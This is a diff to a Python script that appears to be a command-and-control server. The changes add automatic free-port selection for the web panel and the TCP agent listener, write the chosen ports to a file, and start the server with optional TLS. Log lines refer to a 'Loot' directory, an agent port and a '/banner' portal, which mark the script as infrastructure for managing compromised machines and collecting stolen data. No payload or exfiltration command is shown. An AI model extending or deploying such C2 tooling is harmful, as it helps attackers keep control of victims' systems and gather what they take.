@@ -2080,22 +2080,67 @@ h2{{color:#4af;margin-bottom:16px}}
     def _redir(self,path="/panel"):
         self.send_response(302); self.send_header("Location",path); self.end_headers()
 
+def _find_free_port(preferred, search_range=50):
+    """Return preferred port if free, else first free port in range."""
+    import socket as _s
+    for port in [preferred] + list(range(preferred + 1, preferred + search_range)):
+        try:
+            with _s.socket(_s.AF_INET, _s.SOCK_STREAM) as sock:
+                sock.setsockopt(_s.SOL_SOCKET, _s.SO_REUSEADDR, 1)
+                sock.bind(("0.0.0.0", port))
+                return port
+        except OSError:
+            continue
+    raise OSError(f"No free port found in range {preferred}–{preferred + search_range}")
+
+def _find_free_agent_port(preferred, search_range=50):
+    """Same for the TCP agent listener."""
+    import socket as _s
+    for port in [preferred] + list(range(preferred + 1, preferred + search_range)):
+        try:
+            with _s.socket(_s.AF_INET, _s.SOCK_STREAM) as sock:
+                sock.setsockopt(_s.SOL_SOCKET, _s.SO_REUSEADDR, 1)
+                sock.bind(("0.0.0.0", port))
+                return port
+        except OSError:
+            continue
+    raise OSError(f"No free agent port found in range {preferred}–{preferred + search_range}")
+
 if __name__=="__main__":
-    threading.Thread(target=agent_listener,daemon=True).start()
-    httpd=HTTPServer(("0.0.0.0",C2_PORT),H)
-    scheme="http"
+    # Auto-find free ports — never hang on address already in use
+    try:
+        C2_PORT   = _find_free_port(C2_PORT)
+        AGENT_PORT = _find_free_agent_port(AGENT_PORT)
+    except OSError as e:
+        print(f"[!] {e}"); raise SystemExit(1)
+
+    if C2_PORT != int(os.environ.get("C2_PORT", 8888)):
+        log(f"[*] Port {os.environ.get('C2_PORT',8888)} in use — using :{C2_PORT}")
+    if AGENT_PORT != int(os.environ.get("AGENT_PORT", 4444)):
+        log(f"[*] Agent port {os.environ.get('AGENT_PORT',4444)} in use — using :{AGENT_PORT}")
+
+    # Write actual ports to file so start script can read them
+    _port_file = os.path.join(LOG_DIR, "c2_ports.txt")
+    try:
+        with open(_port_file, "w") as _pf:
+            _pf.write(f"C2_PORT={C2_PORT}\nAGENT_PORT={AGENT_PORT}\n")
+    except: pass
+
+    threading.Thread(target=agent_listener, daemon=True).start()
+    httpd = HTTPServer(("0.0.0.0", C2_PORT), H)
+    scheme = "http"
     if USE_TLS:
-        cert,key=_gen_cert()
+        cert, key = _gen_cert()
         if cert and key:
-            ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-            ctx.load_cert_chain(cert,key)
-            httpd.socket=ctx.wrap_socket(httpd.socket,server_side=True)
-            scheme="https"
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            ctx.load_cert_chain(cert, key)
+            httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
+            scheme = "https"
             log("[TLS] Certificate loaded — HTTPS enabled")
         else:
             log("[TLS] cert generation failed — falling back to HTTP")
     log(f"[*] Panel  → {scheme}://0.0.0.0:{C2_PORT}/panel")
-    log(f"[*] TCP :4444 | Loot → {LOOT_DIR}")
+    log(f"[*] TCP :{AGENT_PORT} | Loot → {LOOT_DIR}")
     log(f"[*] Portal → {scheme}://0.0.0.0:{C2_PORT}/banner")
     httpd.serve_forever()
 
